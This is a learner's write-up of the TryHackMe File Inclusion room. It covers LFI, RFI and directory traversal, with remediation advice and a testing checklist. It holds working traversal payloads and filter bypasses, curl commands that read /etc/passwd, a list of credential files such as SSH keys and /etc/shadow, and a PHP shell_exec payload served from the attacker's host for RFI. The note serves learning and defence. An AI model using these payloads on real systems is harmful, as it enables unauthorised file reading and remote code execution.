@@ -1,0 +1,277 @@
+| Lab/Room | File Inclusion - TryHackMe |
+| --- | --- |
+| Type | Classroom |
+| Statut | Done |
+| Date | 22/09/2025 |
+
+# Context
+
+This room is an introduction to **file inclusion**.
+
+A file inclusion happens when a website takes a parameter from a request and uses it to load a file on the server. A parameter is a query string attached to the URL to request data. Example:
+
+```
+http://webapp.com/get.php?file=userCV.pdf
+```
+
+- `http` = protocol
+- `webapp.com` = domain name
+- `get.php` = file name (endpoint)
+- `?` = start of the query string
+- `file` = parameter name
+
+File inclusion vulnerabilities come in several flavors:
+
+- **Local File Inclusion (LFI)** → the app loads a file from the same server (e.g. `../etc/passwd` via directory traversal).
+- **Remote File Inclusion (RFI)** → the app loads a file from a remote URL (less common on modern servers).
+- **Directory traversal** → a technique often used to reach files outside the intended directory (e.g. `../../secret.txt`).
+
+These issues are common in badly written code. The root cause is usually **insufficient sanitization/validation**: the server trusts user input and feeds it directly to file-loading functions.
+
+**Risks:** data leakage (config files, backups, private data), information disclosure, and in some cases chaining an inclusion with other weaknesses can lead to higher-impact issues (e.g., remote code execution).
+
+**Note:** whether RCE is possible depends on many factors — don’t assume it’s automatic.
+
+# Starting hypothesis
+
+While doing this room, my expectation was to learn how to find file inclusion vulnerabilities and how to exploit them, but also to better understand how they happen and at what level.
+
+# Method / Used Tools
+
+## Directory traversal
+
+It’s a path traversal: once the attacker succeeds to read OS resources, they will exploit the vulnerability in the web app URL to reach files or directories stored outside the app on the server.
+
+This vulnerability occurs when you pass a path as input to a function like `file_get_contents()` in PHP. But to be clear, it’s not the function that is the main cause — it’s the act of not securing the input properly.
+
+Directory traversal is also known as the dot-dot-slash attack referring to the use of `../` to move up directories. Example:
+
+```
+http://webapp.com/get.php?file=../../../../etc/passwd
+```
+
+Of course the path will depend on the OS: Linux is different from Windows. For Linux you usually look for `/etc` while for Windows you might look for `boot.ini` (or modern Windows uses BCD).
+
+Below are some OS files you could use when testing:
+
+- `/etc/issue` — contains a message or system identification printed before the login prompt
+- `/etc/profile` — controls system-wide default variables, such as exported variables, file creation mask (`umask`), terminal settings, etc.
+- `/proc/version` — kernel version information on Linux
+- `/etc/passwd` — user account information (not passwords)
+- `/etc/shadow` — hashed password data for system users (restricted)
+- `/root/.bash_history` — root user command history
+- `/var/log/messages` (or `/var/log/dmesg`) — global system messages, including startup logs
+- `/var/mail/root` or `/var/spool/mail/root` — mail for the `root` user
+- `/root/.ssh/id_rsa` — private SSH keys for root or other users (if present)
+- `/var/log/apache2/access.log` — accessed requests for an Apache web server
+- `C:\boot.ini` — boot options for older Windows systems (BIOS); modern Windows uses BCD
+
+## Local File Inclusion — LFI
+
+LFI is caused mainly by lack of input validation in the code. In PHP, functions such as `include`, `require`, `include_once`, and `require_once` are common vectors for this vulnerability, so it’s important to only use them when needed and to secure their inputs strictly.
+
+THM introduces different vulnerability scenarios using PHP, but what works on PHP often applies to other languages too. PHP is still widely used.
+
+### Scenario 1
+
+Weak code example:
+
+```php
+<?php
+    include($_GET["lang"]);
+?>
+```
+
+No security at all — no directory specified, no input validation. Facing this kind of code you can easily reach sensitive data. Example: an e-commerce site using different languages:
+
+`http://monsite.com/index.php?lang=EN.php` — from there you might try to reach any readable file → `http://monsite.com/get.php?file=/etc/passwd`
+
+### Scenario 2
+
+Developer specifies a directory:
+
+```php
+<?php
+    include("languages/".$_GET["lang"]);
+?>
+```
+
+Here the dev forced a `languages/` prefix, but if there’s no input validation you can still escape that by using `../` to navigate up the tree:
+
+```
+http://monsite.thm/index.php?lang=../../../../etc/passwd
+```
+
+(You may need to experiment with the number of `../` depending on the path.)
+
+### Scenario 3
+
+You most of the time won’t know the code behind (black box). You need hypotheses and trial-and-error. Error messages help a lot — if devs didn’t remove them, test, check the error and adapt.
+
+NB: If the dev appended a file extension (e.g. `.php`) and you want to read a non-PHP file, you could try a NULL BYTE (`%00`) attack to terminate the string. This used to work but was fixed in PHP 5.3.4+.
+
+Example (legacy):
+
+```
+http://monsite.thm/index.php?lang=../../../../etc/passwd%00
+```
+
+### Scenario 4
+
+Dev filters keywords. Two common bypasses historically:
+
+1. NULL BYTE (fixed in modern PHP).
+2. Using a trailing dot trick `/etc/passwd/.` — since a single dot refers to the current directory, some filters treating `/` or exact matches can be bypassed and the path still resolves.
+
+E.g. `/etc/passwd/.` resolves effectively to `/etc/passwd/`.
+
+### Scenario 5
+
+Dev filters `../`. One naive filter that only replaces the first `../` can be bypassed by repeating or obfuscating the pattern:
+
+```
+....//....//....//....//etc/passwd
+```
+
+(Depends heavily on how the filtering is implemented. If you can see errors, you’ll find what’s blocked; otherwise you need systematic tests.)
+
+### Scenario 6
+
+Dev forces inclusion from a defined directory. If the app expects `?lang=languages/EN.php`, you must include that directory in your payload to escape it:
+
+```
+?lang=languages/../../../../../etc/passwd
+```
+
+## Remote File Inclusion — RFI
+
+If input is not sanitized and `allow_url_fopen` / `allow_url_include` are enabled, an attacker can inject a remote URL into `include()` and cause the server to fetch and execute remote code. RFI is more dangerous than LFI because it can lead to Remote Code Execution (RCE) and:
+
+- Sensitive information disclosure
+- Cross-site scripting (XSS)
+- Denial of Service (DoS)
+
+For a successful RFI, the remote server must be reachable by the application server (HTTP request) and the server must be configured to allow inclusion of remote files.
+
+## Remediation
+
+To avoid file inclusion (or at least reduce the risk), here’s a clear checklist:
+
+1. Keep systems and services up to date.
+2. Turn off PHP error display in production to avoid leaking info (`display_errors = Off`).
+3. Use a WAF (Web Application Firewall) to help mitigate attacks.
+4. Disable risky PHP features if not needed: set `allow_url_fopen = Off` and `allow_url_include = Off`.
+5. Carefully analyze what protocols and PHP wrappers are necessary; allow only those.
+6. Never trust user input — implement proper input validation and normalization.
+7. Prefer whitelisting over blacklisting; if necessary, combine both.
+
+## Challenge (lab experiences)
+
+### Challenge 1
+
+This was easy with the tips: changing a GET to POST succeeded. You can do it via browser devtools (Network tab) or with curl. Example:
+
+```bash
+curl -X POST 'https://monsite.com/index.php' -d 'file=../../../../etc/flag'
+```
+
+At this step I was confident…
+
+### Challenge 2
+
+This one had an authentication check — only admin could reach the page. Brute force was useless (no login form). The logic flow and cookie tampering ideas came to mind. Cookie tampering worked: changing a cookie value from `Guest` to `Admin` let me access the page. After that I was stuck — the flag was under a different path, so the solution was to request `../../../../etc/flag2` rather than the previous target. Lesson learned: trust your instincts, but verify paths.
+
+### Challenge 3
+
+I got blocked because the dev filtered `/` in the URL. The trick: use a POST body instead of the URL and set the correct `Content-Type` so the server parses the body as expected. Using Burp or properly crafted devtools requests solved it.
+
+### Challenge 4
+
+RFI challenge: goal was to host a malicious PHP that executes `hostname` on the target server and returns the output.
+
+Correct approach for `rfi.php`:
+
+```php
+<?php
+    // simple RCE test: execute 'hostname' and print result
+    echo 'Hostname is: ' . shell_exec('hostname');
+?>
+```
+
+Steps I used:
+
+1. Serve the malicious file locally:
+    
+    `python3 -m http.server 9000`
+    
+2. Trigger the include on the target (if RFI possible):
+    
+    `http://<target_ip_or_domain>/vulnerable.php?file=http://<my_ip>:9000/rfi.php`
+    
+
+(Important: on modern setups, `allow_url_include` is usually disabled — RFI often requires specific server config.)
+
+## Issues I met
+
+The problem wasn’t theory but the practical challenges of the lab: I realized I’m still far from autonomous. I found on Reddit that others felt the same; some said this room has gaps in the THM learning path.
+
+## Solution
+
+Practice. Talent helps, but without practice you can’t succeed. Difficulties are part of progress — they show that you’re learning and getting better.
+
+## What I learned
+
+- File inclusion is dangerous and common; secure your server.
+- RFI can have massive consequences (RCE).
+- Devs sometimes forget to remove error messages — that leaks a lot of info.
+- Without errors, trial and error + methodical testing is essential.
+
+File inclusion is an interesting exploit: it requires strict security to mitigate, but with practice you get faster at finding and exploiting it. Don’t hesitate to combine techniques.
+
+**THM provide good steps for testing for LFI**
+
+1. Find entry points (GET, POST, COOKIE, or HTTP header).
+2. Enter a valid input to see normal behavior.
+3. Enter invalid inputs, including special chars and common file names.
+4. Don’t trust that the input you type is what the app receives — use the address bar or a proxy like Burp.
+5. Look for errors to disclose current paths; if none, rely on trial and error.
+6. Understand the input validation and filters.
+7. Try injecting valid entries to read sensitive files.
+
+# Takeaways
+
+- File inclusion (LFI/RFI) stems from trusting user input — whitelist inputs, normalize and never concatenate raw user data into file loaders.
+- LFI = info disclosure (files, logs, keys); RFI can lead to RCE but requires server config (allow_url_include / reachable remote URL). Don’t assume RCE automatically.
+- Common bypasses: path traversal (`../`), null-byte/trailing-dot tricks (legacy), obfuscated traversal and POST/body vs GET variations — test all input locations (GET, POST, headers, cookies).
+- Remediation essentials: disable `allow_url_include`/`allow_url_fopen`, turn off error display in production, use strict whitelists, and apply WAF + logging/monitoring.
+
+# **Snippet**
+
+```
+LFI/RFI quick checklist:
+1) Find entry points: URL params, POST body, cookies, headers, file uploads, referer, custom params.
+2) Test simple traversal: ?file=../../../../etc/passwd (adjust depth)
+3) Try alternative encodings/obfuscations: url-encode, repeat dots (....//), trailing dot (/etc/passwd/.)
+4) Test POST vs GET (send param in body), try different Content-Types
+5) Check for filters: if '/' blocked, try %2e%2e%2f or variants; if '.' blocked try /etc/passwd/.
+6) Look for remote inclusion: try http://yourserver/rfi.php (only in lab/authorized)
+7) Verify impact: can you read sensitive files? can you reach keys/ssh? Can you chain to RCE?
+8) Always validate via different methods (curl, browser, Burp) and log responses.
+
+Useful commands:
+# quick GET
+curl -s 'http://TARGET/get.php?file=../../../../etc/passwd' | sed -n '1,40p'
+
+# force POST (body) if GET filtered
+curl -s -X POST 'http://TARGET/get.php' -d 'file=../../../../etc/passwd' -H 'Content-Type: application/x-www-form-urlencoded'
+
+# host a malicious file for RFI test (local lab)
+python3 -m http.server 9000
+# then trigger (lab only)
+http://TARGET/vuln.php?file=http://<your-ip>:9000/rfi.php
+
+# compare response sizes/hashes to spot filtering
+curl -s 'http://TARGET/get.php?file=normal.txt' | md5sum
+curl -s 'http://TARGET/get.php?file=../../../../etc/passwd' | md5sum
+
+```
